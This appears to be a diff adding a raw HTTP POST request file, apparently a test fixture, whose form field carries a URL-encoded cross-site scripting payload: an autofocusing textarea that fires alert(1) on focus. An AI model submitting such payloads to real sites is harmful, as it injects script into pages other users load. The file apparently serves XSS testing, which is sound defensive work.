@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Connection: close
+
+name=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E
